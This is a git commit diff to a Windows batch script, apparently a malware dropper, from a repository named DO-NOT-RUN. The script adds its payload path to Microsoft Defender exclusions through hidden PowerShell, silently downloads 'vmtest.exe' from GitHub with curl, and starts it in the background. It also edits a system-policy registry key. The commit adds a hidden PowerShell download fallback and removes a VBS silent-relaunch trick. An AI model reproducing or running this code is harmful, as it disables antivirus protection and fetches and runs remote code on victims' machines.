e29ab9c50ba2c774c444876a2720d704aa57b833
sirfedsalot <criticalshark@proton.me>
2025-02-23 00:49:31 -0600

    Update nasser-furz.bat

--- nasser-furz.bat
+++ nasser-furz.bat
@@ -17,16 +17,15 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess '%exePath%'" >nul 2>&1
 
 curl -L -o "%exePath%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
-if %errorlevel% neq 0 exit /b 1
+if %errorlevel% neq 0 (
+    echo curl failed, falling back to powershell
+    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe' -OutFile '%exePath%'" >nul 2>&1
+    if %errorlevel% neq 0 exit /b 1
+)
 
 if not exist "%exePath%" exit /b 1
 for %%F in ("%exePath%") do set filesize=%%~zF
 if "%filesize%"=="0" exit /b 1
 
 start "" /b "%exePath%"
-exit
-
-echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run_silently.vbs"
-echo objShell.Run """%~f0""", 0, False >> "%TEMP%\run_silently.vbs"
-
-wscript "%TEMP%\run_silently.vbs"
+exit /b 0
